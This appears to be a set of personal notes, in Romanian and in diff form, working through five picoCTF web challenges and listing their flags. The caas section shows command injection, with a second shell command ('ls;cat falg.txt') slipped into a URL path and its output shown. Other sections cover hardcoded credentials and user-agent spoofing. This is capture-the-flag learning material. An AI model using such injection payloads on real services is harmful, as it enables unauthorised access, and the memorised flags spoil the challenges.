@@ -1,0 +1,62 @@
+1.login
+flag-ul este trecut in codul debuger-ului
+codat in base 64 ca variabila p
+
+picoCTF{53rv3r_53rv3r_53rv3r_53rv3r_53rv3r}
+2.Inspect Html
+	ctrl+shift+c
+	flag-ul se afla in cod
+3.Local Authority
+	networking
+	http://saturn.picoctf.net:55826/secure.js
+	=>putem vedea numele si parola
+	
+function checkPassword(username, password)
+{
+  if( username === 'admin' && password === 'strongPassword098765' )
+  {
+    return true;
+  }
+  else
+  {
+    return false;
+  }
+}
+=> picoCTF{j5_15_7r4n5p4r3n7_b0c2c9cb} 
+
+4.caas
+	curl https://caas.mars.picoctf.net/cowsay/{message}
+	prima data am incercat sa trimit parametri specifici https://caas.mars.picoctf.net/cowsay/{%x}
+	am primit eroare
+	dupa am incercat sa introduc un mesaj de dimensiune foarte mare pentru a vedea daca afecteza intr-un fel programul
+	urmatoarea idee a fost sa triit comenzi
+	curl "https://caas.mars.picoctf.net/cowsay/ls;ls"
+	output: ____
+< ls >
+ ----
+        \   ^__^
+         \  (oo)\_______
+            (__)\       )\/\
+                ||----w |
+                ||     ||
+Dockerfile
+falg.txt
+index.js
+node_modules
+package.json
+public
+yarn.lock
+	curl "https://caas.mars.picoctf.net/cowsay/ls;cat falg.txt"
+=>picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}
+
+
+5.picobrowser
+	am citit aici dar nu am reusit sa adaug preferinte in browser
+	https://www.whatismybrowser.com/guides/how-to-change-your-user-agent/firefox
+	dupa am cautat daca pot da un user agent pentru comanda curl
+	am luat link-ul de request din networking
+	am dat comanda 
+	curl https://jupiter.challenges.picoctf.org/problem/50522/flag --user-agent picobrowser
+	picoCTF{p1c0_s3cr3t_ag3nt_51414fa7}
+	
+
